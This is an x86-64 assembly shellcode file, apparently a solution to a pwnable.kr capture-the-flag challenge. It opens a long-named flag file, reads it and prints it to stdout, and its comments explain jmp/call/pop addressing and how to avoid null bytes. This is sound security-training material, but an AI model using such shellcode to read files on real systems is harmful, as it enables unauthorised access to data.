	global _start
	_start:

	;1) open(rdi = file path,rsi = O_RDONLY) , rax = 2
	xor rax,rax
	add al,2 ;syscall open = #2
	
	jmp short @flag_file_name ;jmp to a call instrcution to push flag_file_name address to the stack
	
	@open_syscall:
	pop rdi ;rdi = adr of flag_file_name
	
	xor rsi,rsi ; rsi = O_RDONLY = 0
	
	syscall ;on success this syscall will return in rax a fd for the flag file
	
	;--------------------------------------------------------------------------------------
	;2) read(rdi = flag_fd (that is in rax),rsi = @flag,rdx = 30) , rax = 0
	; we read up to 30 bytes just to be sure we get the whole flag
	
	mov rdi, rax ;mov fd to rdi before changing rax
	
	xor rax,rax ; syscall read = #0
	
	jmp short @flag_pos ;jmp to a call instrcution to push flag address to the stack
	
	@read_syscall:
	pop rsi ;rsi = adr where we want to store the flag
	
	xor rdx,rdx
	mov dl,30 ;rdx = 30, max bytes to read
	
	syscall
	
	;--------------------------------------------------------------------------------------
	;3) write(rdi = STDOUT, rsi = @flag, rdx = 30), rax = 1
	
	xor rax,rax 
	inc rax ;syscall write = #1
	
	mov rdi, rax ;rdi = STDOUT = 1
	
	;rsi remains with the address of flag from last syscall
	;rdx remain 30 - max bytes to write from last syscall
	
	syscall
	
	;--------------------------------------------------------------------------------------
	;4) exit(0):
    xor rax, rax
    add rax, 60 ; syscall exit = #60
    xor rdi, rdi; rdi = 0 -> exit on success exit(0)
	
    syscall
	
	;we place the flag buffer before the flag file name because of jump short:
	;we use 'jmp short' and not 'jmp' to get the addresses we need for the syscalls without creating null bytes.
	;jmp short is a relative jump to +- 127 bytes from the current addr. our flag file name is 231 bytes long -> 
	;so in order that jmp short will work properly we need the actual flag buffer to be placed before the long string.
	
	;another soltion is to place the flag buffer on the stack using rsp: this avoids jmp short issues and allows us to place a much bigger buffer with no concerns
	@flag_pos:
	call @read_syscall
	db 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',0xA
	
	@flag_file_name:
	call @open_syscall
	db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
	
	;we place a null byte at the end of the string to mark the end of the string
	;db 0x00 by itself doesnt create a null byte of itself in the compiled elf so we need to add another bytes after it.
	;another solution is to place the null byte manually when sending the shellcode to the program
	@put_here_null_byte: 
	db 0x00,0xA 
	 
	
	
	
